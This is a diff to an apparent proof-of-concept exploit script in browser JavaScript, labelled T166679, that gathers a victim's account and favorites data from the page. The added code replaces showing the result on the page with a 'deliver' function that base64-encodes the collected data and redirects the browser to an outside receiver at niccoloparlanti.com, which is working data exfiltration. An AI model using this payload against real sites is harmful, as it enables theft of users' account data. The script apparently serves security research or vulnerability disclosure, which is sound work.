@@ -1,3 +1,13 @@
+(() => {
+  window.name = "";
+  if (window.__t166679HostedProofStarted) return;
+  window.__t166679HostedProofStarted = true;
+  const statusNode = document.createElement("div");
+  statusNode.id = "t166679-running";
+  statusNode.textContent = "Collecting proof...";
+  statusNode.style.cssText = "position:fixed;inset:16px auto auto 16px;z-index:2147483647;padding:12px 16px;background:#111;color:#7ee787;border:1px solid #7ee787;border-radius:6px;font:16px system-ui";
+  (document.body || document.documentElement).appendChild(statusNode);
+
 (async () => {
   if (window.__t166679FavoritesProofRunning) {
     return;
@@ -341,22 +351,28 @@
   window.__t166679PublicResultRunning = true;
   const proofScript = document.currentScript?.src || null;
   const started = Date.now();
-  const render = (type, account, favorite) => {
+  const encode = (value) => {
+    const bytes = new TextEncoder().encode(JSON.stringify(value));
+    let binary = "";
+    for (let offset = 0; offset < bytes.length; offset += 32768) {
+      binary += String.fromCharCode(...bytes.subarray(offset, offset + 32768));
+    }
+    return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+  };
+  const deliver = (type, account, favorite) => {
     const result = {
       type,
       page: {
         origin: location.origin,
         baseUri: document.baseURI,
         proofScript,
+        receiver: "https://niccoloparlanti.com/r.html",
       },
       account,
       favorite,
     };
     window.name = "";
-    document.open();
-    document.write('<!doctype html><meta charset="utf-8"><title>PoC result</title><style>body{font:16px system-ui;margin:2rem;background:#111;color:#eee}h1{color:#7ee787}pre{white-space:pre-wrap;overflow-wrap:anywhere;padding:1rem;background:#1b1f24;border:1px solid #444;border-radius:8px}</style><h1>PoC result</h1><pre id="result"></pre>');
-    document.close();
-    document.getElementById("result").textContent = JSON.stringify(result, null, 2);
+    location.replace("https://niccoloparlanti.com/r.html#" + encode(result));
   };
   const timer = setInterval(() => {
     let account = null;
@@ -369,12 +385,13 @@
     } catch (_) {}
     if (account?.done === true && favorite?.done === true) {
       clearInterval(timer);
-      render("T166679_ONE_CLICK_RESULT", account, favorite);
+      deliver("T166679_ONE_CLICK_RESULT", account, favorite);
       return;
     }
     if (Date.now() - started > 150000) {
       clearInterval(timer);
-      render("T166679_ONE_CLICK_TIMEOUT", account, favorite);
+      deliver("T166679_ONE_CLICK_TIMEOUT", account, favorite);
     }
   }, 250);
+})();
 })();
